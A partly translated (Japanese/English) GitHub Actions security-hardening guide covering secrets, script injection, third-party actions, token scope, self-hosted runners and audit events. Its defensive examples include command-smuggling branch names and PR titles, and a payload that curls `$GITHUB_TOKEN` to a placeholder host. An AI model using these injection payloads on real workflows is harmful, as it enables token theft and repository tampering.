---
title: GitHub Actions のセキュリティ強化
shortTitle: セキュリティ強化
intro: '{% data variables.product.prodname_actions %} の機能を使用するための適切なセキュリティプラクティス。'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
---

{% data reusables.actions.enterprise-beta %}
{% data reusables.actions.enterprise-github-hosted-runners %}

## 概要

このガイドでは、特定の {% data variables.product.prodname_actions %} の機能のセキュリティ強化を設定する方法について説明します。 {% data variables.product.prodname_actions %} の概念について理解を深めるには、「[GitHub Actions の中核的概念](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)」を参照してください。

## シークレットを使用する

機密性の高い値は、平文としてワークフローファイルに保存するのではなく、シークレットとして保存してください。 [Secrets](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) can be configured at the organization, repository, or environment level, and allow you to store sensitive information in {% data variables.product.product_name %}.

シークレットは [Libsodium sealed boxes](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes) を使用するため、{% data variables.product.product_name %} に到達する前に暗号化されます。 これは、[UI を使用](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository)して、または [REST API](/rest/reference/actions#secrets) を介してシークレットが送信されたときに発生します。 このクライアント側の暗号化により、{% data variables.product.product_name %} のインフラストラクチャ内での偶発的なログ（例外ログやリクエストログなど）に関連するリスクを最小限に抑えることができます。 シークレットがアップロードされると、{% data variables.product.product_name %} はそれを復号化して、ワークフローランタイムに挿入できるようになります。

偶発的な開示を防ぐために、{% data variables.product.product_name %} は、実行ログに表示されるシークレットを編集しようとするメカニズムを使用しています。 この編集は、設定されたシークレットの完全一致、および Base64 などの値の一般的なエンコーディングを検索します。 ただし、シークレットの値を変換する方法は複数あるため、この編集は保証されません。 そのため、シークレットを確実に編集し、シークレットに関連する他のリスクを制限するために実行する必要がある、特定の予防的ステップと推奨事項は次のとおりです。

- **構造化データをシークレットとして使用しない**
    - 構造化データは、ログ内のシークレットの編集失敗の原因となる可能性があります。これは、編集が特定のシークレット値の完全一致を見つけることに大きく依存しているためです。 たとえば、JSON、XML、または YAML（または同様）の Blob を使用してシークレット値をカプセル化しないでください。シークレットが適切に編集される可能性が大幅に低下するためです。 代わりに、機密値ごとに個別のシークレットを作成します。
- **ワークフロー内で使用されるすべてのシークレットを登録する**
    - シークレットを使用してワークフロー内で別の機密値を生成する場合は、生成された値を正式に[シークレットとして登録](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)して、ログに表示されたときに編集されるようにする必要があります。 たとえば、秘密鍵を使用して署名済み JWT を生成し、Web API にアクセスする場合は、その JWT をシークレットとして登録してください。そうしない場合、ログ出力に入力されても編集されません。
    - シークレットの登録は、あらゆる種類の変換/エンコーディングにも適用されます。 シークレットが何らかの方法で変換された場合（Base64 や URL エンコードなど）、新しい値もシークレットとして登録してください。
- **シークレットの処理方法を監査する**
    - シークレットの使用方法を監査し、シークレットが想定どおりに処理されていることを確認します。 これを行うには、ワークフローを実行しているリポジトリのソースコードを確認し、ワークフローで使用されているアクションを確認します。 たとえば、意図しないホストに送信されていないか、またはログ出力に明示的に出力されていないかを確認します。
    - 有効/無効な入力をテストした後、ワークフローの実行ログを表示し、シークレットが正しく編集されているか、表示されていないかを確認します。 呼び出しているコマンドまたはツールがどのようにしてエラーを `STDOUT` および `STDERR` に送信するかは必ずしも明らかではなく、シークレットはその後エラーログに記録される可能性があります。 そのため、有効な入力と無効な入力をテストした後、ワークフローログを手動で確認することをお勧めします。
- **スコープが最小限の認証情報を使用する**
    - ワークフロー内で使用されている認証情報に必要な最小限の権限があることを確認し、リポジトリへの書き込みアクセスを持つすべてのユーザが、リポジトリで設定されたすべてのシークレットへの読み取りアクセスを持っていることに注意してください。 {% ifversion fpt or ghes > 3.1 or ghae or ghec %}
    - Actions は、`github.token` コンテキストからアクセスすることで `GITHUB_TOKEN` を使用できます。 詳細については、「[コンテキスト](/actions/learn-github-actions/contexts#github-context)」を参照してください。 したがって、`GITHUB_TOKEN` に最低限必要な権限が付与されていることを確認する必要があります。 リポジトリのコンテンツに対してのみ読み取りアクセスを行うように `GITHUB_TOKEN` のデフォルトのアクセス許可を設定することをお勧めします。 その後、必要に応じて、ワークフローファイル内の個々のジョブの権限を増やすことができます。 詳しい情報については、「[ワークフローでの認証](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)」を参照してください。 {% endif %}
- **登録されたシークレットの監査とローテーション**
    - 登録されたシークレットを定期的に確認して、現在も必要であることを確認します。 不要になったものは削除してください。
    - シークレットを定期的にローテーションして、不正使用されたシークレットが有効である期間を短縮します。
- **シークレットへのアクセスのレビューを必須とすることを検討する**
    - 必須のレビュー担当者を使って環境のシークレットを保護できます。 レビュー担当者によって許可されるまで、ワークフローのジョブは環境のシークレットにアクセスできません。 For more information about storing secrets in environments or requiring reviews for environments, see "[Encrypted secrets](/actions/reference/encrypted-secrets)" and "[Using environments for deployment](/actions/deployment/using-environments-for-deployment)."

{% warning %}

**Warning**: Any user with write access to your repository has read access to all secrets configured in your repository. Therefore, you should ensure that the credentials being used within workflows have the least privileges required.

{% endwarning %}

## Using `CODEOWNERS` to monitor changes

You can use the `CODEOWNERS` feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in `.github/workflows`, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.

詳細は「[コードオーナーについて](/github/creating-cloning-and-archiving-repositories/about-code-owners)」を参照してください。

## Understanding the risk of script injections

When creating workflows, [custom actions](/actions/creating-actions/about-actions), and [composite actions](/actions/creating-actions/creating-a-composite-action) actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.

 Attackers can add their own malicious content to the [`github` context](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`.  For example: `github.event.issue.title`, or `github.event.pull_request.body`.

 You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of {% data variables.product.prodname_actions %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."

In addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, `zzz";echo${IFS}"hello";#` would be a valid branch name and would be a possible attack vector for a target repository.

The following sections explain how you can help mitigate the risk of script injection.

### Example of a script injection attack

A script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

This example is vulnerable to script injection because the `run` command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside {% raw %}`${{ }}`{% endraw %} are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection.

To inject commands into this workflow, the attacker could create a pull request with a title of  `a"; ls $GITHUB_WORKSPACE"`:

![Example of script injection in PR title](/assets/images/help/images/example-script-injection-pr-title.png)

In this example, the `"` character is used to interrupt the {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} statement, allowing the `ls` command to be executed on the runner. You can see the output of the `ls` command in the log:

![Example result of script injection](/assets/images/help/images/example-script-injection-result.png)

## Good practices for mitigating script injection attacks

There are a number of different approaches available to help you mitigate the risk of script injection:

### Using an action instead of an inline script (recommended)

The recommended approach is to create an action that processes the context value as an argument. This approach is not vulnerable to the injection attack, as the context value is not used to generate a shell script, but is instead passed to the action as an argument:

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Using an intermediate environment variable

For inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.

The following example uses Bash to process the `github.event.pull_request.title` value as an environment variable:

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

In this example, the attempted script injection is unsuccessful:

![Example of mitigated script injection](/assets/images/help/images/example-script-injection-mitigated.png)

With this approach, the value of the {% raw %}`${{ github.event.issue.title }}`{% endraw %} expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid [word splitting](https://github.com/koalaman/shellcheck/wiki/SC2086), but this is [one of many](https://mywiki.wooledge.org/BashPitfalls) general recommendations for writing shell scripts, and is not specific to {% data variables.product.prodname_actions %}.

{% ifversion fpt or ghec %}
### Using starter workflows for code scanning

{% data reusables.advanced-security.starter-workflows-beta %}
{% data variables.product.prodname_code_scanning_capc %} allows you to find security vulnerabilities before they reach production. {% data variables.product.product_name %} provides starter workflows for {% data variables.product.prodname_code_scanning %}. You can use these suggested workflows to construct your {% data variables.product.prodname_code_scanning %} workflows, instead of starting from scratch. {% data variables.product.company_short%}'s workflow, the {% data variables.product.prodname_codeql_workflow %}, is powered by {% data variables.product.prodname_codeql %}. There are also third-party starter workflows available.

For more information, see "[About {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" and "[Setting up {% data variables.product.prodname_code_scanning %} using starter workflows](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)."

{% endif %}

### Restricting permissions for tokens

To help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see "[Modifying the permissions for the GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)."

{% ifversion fpt or ghec or ghae-issue-4856 %}

## Using OpenID Connect to access cloud resources

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## サードパーティアクションを使用する

ワークフロー内の個々のジョブは、他のジョブと相互作用（および侵害）する場合があります。 たとえば、後のジョブで使用される環境変数をクエリするジョブ、後のジョブが処理する共有ディレクトリにファイルを書き込むジョブ、あるいはもっと直接的にDocker ソケットとやり取りして他の実行中のコンテナを検査してコマンドを実行するジョブなどです。

これは、ワークフロー内の 1 つのアクションへの侵害が非常に重要になる可能性があるということです。その侵害されたアクションがリポジトリに設定されたすべてのシークレットにアクセスし、`GITHUB_TOKEN` を使用してリポジトリに書き込むことができるためです。 したがって、{% data variables.product.prodname_dotcom %} のサードパーティリポジトリからアクションを調達することには大きなリスクがあります。 For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."

次のような適切な方法に従うことで、このリスクを軽減することができます。

* **アクションを完全なコミット SHA にピン止めする**

  現在、アクションを不変のリリースとして使用する唯一の方法は、アクションを完全なコミット SHA にピン止めすることです。 特定の SHA にピン止めすると、有効な Git オブジェクトペイロードに対して SHA-1 衝突を生成する必要があるため、悪意のある人がアクションのリポジトリにバックドアを追加するリスクを軽減できます。



* **アクションのソースコードを監査する**

  アクションが想定どおりにリポジトリとシークレットのコンテンツを処理していることを確認します。 たとえば、シークレットが意図しないホストに送信されていないか、または誤ってログに記録されていないかを確認します。

* **作成者を信頼できる場合に限り、アクションをタグにピン止めする**

  コミット SHA に対するピン止めが最も安全なオプションですが、タグを指定する方が便利で広く使用されています。 タグを指定する場合は、アクションの作成者が信頼できることを確認してください。 {% data variables.product.prodname_marketplace %} の「Verified creator」バッジは便利な判断材料で、 {% data variables.product.prodname_dotcom %} で身元が確認されたチームによって作成されたアクションであることを示しています。 作者が信頼できる場合でも、このアプローチにはリスクがあることに注意してください。悪意のある人がアクションを保存しているリポジトリにアクセスすると、タグが移動または削除される可能性があります。

{% ifversion fpt or ghes > 3.3 or ghae-issue-4757 or ghec %}
## Reusing third-party workflows

The same principles described above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, see "[Reusing workflows](/actions/learn-github-actions/reusing-workflows)."
{% endif %}

{% if internal-actions %}
## Allowing workflows to access internal repositories

{% data reusables.actions.outside-collaborators-internal-actions %} For more information, see "[Sharing actions and workflows with your enterprise](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)."
{% endif %}

## Using OpenSSF Scorecards to secure workflows

[Scorecards](https://github.com/ossf/scorecard) is an automated security tool that flags risky supply chain practices. You can use the [Scorecards action](https://github.com/marketplace/actions/ossf-scorecard-action) and [starter workflow](https://github.com/actions/starter-workflows) to follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions.

## Potential impact of a compromised runner

These sections consider some of the steps an attacker can take if they're able to run malicious commands on a {% data variables.product.prodname_actions %} runner.

### Accessing secrets

Workflows triggered using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues` and `push`, where the attacker could attempt to steal repository secrets or use the write permission of the job's [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token).

- If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.
- If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.
- For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Although {% data variables.product.prodname_actions %} scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.

### Exfiltrating data from a runner

An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, {% data variables.product.prodname_actions %} [automatically redact secrets printed to the log](/actions/reference/encrypted-secrets#accessing-your-secrets), but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.

### Stealing the job's `GITHUB_TOKEN`

It is possible for an attacker to steal a job's `GITHUB_TOKEN`. The {% data variables.product.prodname_actions %} runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a"; set +e; curl http://example.lab?token=$GITHUB_TOKEN;#`.

### Modifying the contents of a repository

The attacker server can use the {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API to [modify repository content](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## リポジトリ間のアクセスを検討する

{% data variables.product.prodname_actions %} is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file{% ifversion fpt or ghes > 3.1 or ghae or ghec %}, elevating the permissions of the `GITHUB_TOKEN` if necessary{% endif %}. ユーザはリポジトリごとに特定の権限を持っているため、1 つのリポジトリの `GITHUB_TOKEN` に別のリポジトリへのアクセスを許可すると、慎重に実装しない場合 {% data variables.product.prodname_dotcom %} 権限モデルに影響します。 同様に、{% data variables.product.prodname_dotcom %} 認証トークンをワークフローに追加する場合は注意が必要です。これは、コラボレータに誤って広範なアクセスを付与することにより、{% data variables.product.prodname_dotcom %} アクセス許可モデルにも影響を与える可能性があるためです。

[{% data variables.product.prodname_dotcom %} ロードマップ](https://github.com/github/roadmap/issues/74)では、{% data variables.product.product_name %} 内のリポジトリ間アクセスを可能にするフローをサポートする計画がありますが、この機能はまだサポートされていません。 現在、権限のあるリポジトリ間のやり取りを実行する唯一の方法は、ワークフロー内に {% data variables.product.prodname_dotcom %} 認証トークンまたは SSH キーをシークレットとして配置することです。 多くの認証トークンタイプでは特定のリソースへの詳細なアクセスが許可されていないことから、意図したものよりはるかに広範なアクセスを許可できるため、間違ったトークンタイプを使用すると重大なリスクが生じます。

次のリストでは、ワークフロー内のリポジトリデータにアクセスするための推奨アプローチを優先度の高い順に説明しています。

1. **`GITHUB_TOKEN`**
    -  このトークンは、ワークフローを呼び出した単一のリポジトリに意図的にスコープされており、リポジトリの書き込みアクセスを持つユーザと同じレベルのアクセス権を{% ifversion fpt or ghes > 3.1 or ghae or ghec %}持つ{% else %}ことができます{% endif %}。 トークンは各ジョブが開始する前に作成され、ジョブが終了すると期限切れになります。 詳しい情報については「[GITHUB_TOKENでの認証](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)」を参照してください。
    - 可能な場合は、常に `GITHUB_TOKEN` を使用する必要があります。
2. **リポジトリのデプロイキー**
    - デプロイキーは、単一のリポジトリへの読み取りまたは書き込みアクセスを許可する唯一の認証情報タイプの 1 つであり、ワークフロー内の別のリポジトリとのやり取りに使用できます。 詳しい情報については、「[デプロイキーを管理する](/developers/overview/managing-deploy-keys#deploy-keys)」を参照してください。
    - デプロイキーは Git を使用してリポジトリに複製およびプッシュできるだけであり、REST または GraphQL API とのやり取りには使用できないため、要件に適さない場合があることに注意してください。
3. **{% data variables.product.prodname_github_app %} トークン**
    - {% data variables.product.prodname_github_apps %} は、選択したリポジトリにインストールでき、リポジトリ内のリソースに対する詳細な権限を持つこともできます。 Organization の内部で {% data variables.product.prodname_github_app %} を作成し、ワークフロー内でアクセスする必要があるリポジトリにインストールして、それらのリポジトリにアクセスするためのワークフロー内のインストールとして認証できます。
4. **個人アクセストークン**
    - 自分のアカウントから個人アクセストークンを使用しないでください。 These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. これにより、ワークフローが含まれているリポジトリのすべての書き込みアクセスユーザに間接的に広範なアクセス権が付与されます。 さらに、後で Organization を離れると、このトークンを使用するワークフローはすぐに中断され、この問題のデバッグが困難になる場合があります。
    - 個人アクセストークンを使用する場合は、ワークフローに必要な特定のリポジトリへのアクセスのみが許可される新しいアカウント用に生成されたものを使用してください。 このアプローチはスケーラブルではないため、デプロイキーなどの代替案を優先して避ける必要があります。
5. **SSH keys on a personal account**
    - Workflows should never use the SSH keys on a personal account. これらは、個人アクセストークンと同様に、すべての個人リポジトリと、Organization のメンバーシップを通じてアクセスできるすべてのリポジトリに読み取り/書き込み権限を付与します。  これにより、ワークフローが含まれているリポジトリのすべての書き込みアクセスユーザに間接的に広範なアクセス権が付与されます。 リポジトリのクローンまたはプッシュのみを実行する必要があり、パブリック API とやり取りする必要がないため、SSH キーを使用する場合は、代わりに個別のデプロイキーを使用する必要があります。

## セルフホストランナーを強化する

{% ifversion fpt or ghec %}
**{% data variables.product.prodname_dotcom %} でホストされた**ランナーは、一過性でクリーンな隔離された仮想マシン内でコードを実行します。つまり、この環境を永続的に危険にさらしたり、ブートストラッププロセス中にこの環境に置かれた以上の情報にアクセスしたりする方法はありません。
{% endif %}

{% ifversion fpt or ghec %}**Self-hosted**{% elsif ghes or ghae %}Self-hosted{% endif %} runners for {% data variables.product.product_name %} do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.

{% ifversion fpt or ghec %}As a result, self-hosted runners should almost [never be used for public repositories](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security-with-public-repositories) on {% data variables.product.product_name %}, because any user can open pull requests against the repository and compromise the environment. Similarly, be{% elsif ghes or ghae %}Be{% endif %} cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the `GITHUB_TOKEN` which{% ifversion fpt or ghes > 3.1 or ghae or ghec %}, depending on its settings, can grant {% else %} grants {% endif %}write access to the repository. ワークフローは、環境と必要なレビューを使用して環境シークレットへのアクセスを制御できますが、これらのワークフローは分離された環境では実行されず、セルフホストランナーで実行した場合でも同じリスクの影響を受けやすくなります。

セルフホストランナーがOrganizationもしくはEnterpriseのレベルで定義されているなら、{% data variables.product.product_name %}は同じランナー上で複数のリポジトリからのワークフローをスケジューリングするかもしれません。 したがって、これらの環境へのセキュリティ侵害は、大きな影響をもたらす可能性があります。 侵害の範囲を狭めるために、セルフホストランナーを個別のグループにまとめることで、境界を作ることができます。 You can restrict what {% if restrict-groups-to-workflows %}workflows, {% endif %}organizations and repositories can access runner groups. 詳しい情報については、「[グループを使用したセルフホストランナーへのアクセスを管理する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)」を参照してください。

次のように、セルフホストランナーマシンの環境も考慮する必要があります。
- セルフホストランナーとして設定されたマシンにはどのような機密情報が存在するか。 たとえば、SSH 秘密鍵、API アクセストークンなどです。
- マシンが機密性の高いサービスにネットワークアクセス可能か。 たとえば、Azure または AWS メタデータサービスなどです。 この環境での機密情報量は最小限に抑える必要があります。ワークフローを呼び出すことができるすべてのユーザがこの環境にアクセスできることを常に意識しておいてください。

中には、それぞれのジョブの実行後にセルフホストランナーを自動的に破棄するようなシステムを実装することで、このリスクを部分的に軽減しようとするお客様もいます。 しかし、このアプローチは意図したほどには効果的ではないかもしれません。これは、セルフホストランナーが1つのジョブだけを実行するという保証がないためです。 Some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such as `ps x -w`. This can lead to secret leakages.

### Planning your management strategy for self-hosted runners

A self-hosted runner can be added to various levels in your {% data variables.product.prodname_dotcom %} hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:

**Centralized management:**
  - If you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners.
  - If you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the future.

**Decentralized management:**
  - If each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too.
  - You could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories.

{% ifversion fpt or ghec or ghae-issue-4856 %}
### Authenticating to your cloud provider

If you are using {% data variables.product.prodname_actions %} to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, see "[About security hardening with OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)."

{% endif %}

## {% data variables.product.prodname_actions %}イベントの監査

Organizationの管理タスクをモニタするために、監査ログを使用できます。 The audit log records the type of action, when it was run, and which personal account performed the action.

たとえば、監査ログを使用して、Organization のシークレットへの変更を追跡する `org.update_actions_secret` イベントを追跡できます。 ![監査ログのエントリ](/assets/images/help/repository/audit-log-entries.png)

以下の表は、監査ログにある{% data variables.product.prodname_actions %}のイベントを示します。 For more information on using the audit log, see "[Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)" and "[Reviewing audit logs for your enterprise](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)."

{% ifversion fpt or ghec %}
### 環境のイベント

| アクション                               | 説明                                                                                                                   |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `environment.create_actions_secret` | シークレットが環境で作成されたときにトリガーされます。 詳しい情報については、「[環境のシークレット](/actions/reference/environments#environment-secrets)」を参照してください。  |
| `environment.delete`                | 環境が削除されるとトリガーされます。 詳しい情報については、「[環境を削除する](/actions/reference/environments#deleting-an-environment)」を参照してください。         |
| `environment.remove_actions_secret` | シークレットが環境で削除されたときにトリガーされます。 詳しい情報については、「[環境のシークレット](/actions/reference/environments#environment-secrets)」を参照してください。  |
| `environment.update_actions_secret` | 環境内のシークレットが更新されたときにトリガーされます。 詳しい情報については、「[環境のシークレット](/actions/reference/environments#environment-secrets)」を参照してください。 |
{% endif %}

{% ifversion fpt or ghes or ghec %}
### 設定変更のイベント
| アクション                                 | 説明                                                                                                                                                                                                            |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `repo.actions_enabled`                | リポジトリに対して {% data variables.product.prodname_actions %} が有効化されたときにトリガーされます。 UI を使用して表示できます。 このイベントは、REST API を使用して Audit log にアクセスした場合には表示されません。 詳しい情報については、「[REST API を使用する](#using-the-rest-api)」を参照してください。 |
| `repo.update_actions_access_settings` | Triggered when the setting to control how your repository is used by {% data variables.product.prodname_actions %} workflows in other repositories is changed.                                                |
{% endif %}

### シークレット管理のイベント
| アクション                        | 説明                                                                                                                                                                                                                                     |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `org.create_actions_secret`  | Organization に対して {% data variables.product.prodname_actions %} シークレットが作成されたときにトリガーされます。 詳しい情報については、「[Organization の暗号化されたシークレットを作成する](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)」を参照してください。 |
| `org.remove_actions_secret`  | {% data variables.product.prodname_actions %} シークレットが削除されたときにトリガーされます。                                                                                                                                                                 |
| `org.update_actions_secret`  | {% data variables.product.prodname_actions %} シークレットが更新されたときにトリガーされます。                                                                                                                                                                 |
| `repo.create_actions_secret` | リポジトリに対して {% data variables.product.prodname_actions %} シークレットが作成されたときにトリガーされます。 詳しい情報については、「[リポジトリに対して暗号化されたシークレットを作成する](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)」を参照してください。                 |
| `repo.remove_actions_secret` | {% data variables.product.prodname_actions %} シークレットが削除されたときにトリガーされます。                                                                                                                                                                 |
| `repo.update_actions_secret` | {% data variables.product.prodname_actions %} シークレットが更新されたときにトリガーされます。                                                                                                                                                                 |

### セルフホストランナーのイベント
| アクション                                     | 説明                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enterprise.register_self_hosted_runner`  | 新しいセルフホストランナーが登録されたときにトリガーされます。 詳しい情報については「[Enterpriseへのセルフホストランナーの追加](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)」を参照してください。                                                                                                                                                                                                                        |
| `enterprise.remove_self_hosted_runner`    | セルフホストランナーが削除されたときにトリガーされます。                                                                                                                                                                                                                                                                                                                                                                                        |
| `enterprise.runner_group_runners_updated` | Triggered when a runner group's member list is updated. 詳しい情報については、「[Organizationのグループにセルフホストランナーを設定する](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)」を参照してください。{% ifversion fpt or ghes > 3.1  or ghae or ghec %}
| `enterprise.self_hosted_runner_online`    | ランナーアプリケーションが開始されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳しい情報については「[セルフホストランナーのステータスチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。                                                                                                                                             |
| `enterprise.self_hosted_runner_offline`   | ランナーアプリケーションが停止されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳しい情報については、「[セルフホストランナーのステータスチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。{% endif %}
| `enterprise.self_hosted_runner_updated`   | ランナーアプリケーションが更新されたときにトリガーされます。 REST API と UI を使用して表示できます。 Audit log を JSON データまたは CSV ファイルとしてエクスポートする場合、このイベントは含まれません。 詳しい情報については、「[セルフホストランナーについて](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)」および「[Organization の Audit log をレビューする](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)」を参照してください。 |
| `org.register_self_hosted_runner`         | 新しいセルフホストランナーが登録されたときにトリガーされます。 詳しい情報については、「[Organization へのセルフホストランナーの追加](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)」を参照してください。                                                                                                                                                                                                                  |
| `org.remove_self_hosted_runner`           | セルフホストランナーが削除されたときにトリガーされます。 詳しい情報については、「[Organization からランナーを削除する](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization)」を参照してください。                                                                                                                                                                                                                               |
| `org.runner_group_runners_updated`        | ランナーグループのメンバーリストが更新されたときにトリガーされます。 詳しい情報については「[Organizationのグループ内にセルフホストランナーをセットする](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)」を参照してください。                                                                                                                                                                                                                                      |
| `org.runner_group_updated`                | セルフホストランナーグループの設定が変更されたときにトリガーされます。 For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."{% ifversion fpt or ghes > 3.1 or ghae or ghec %}
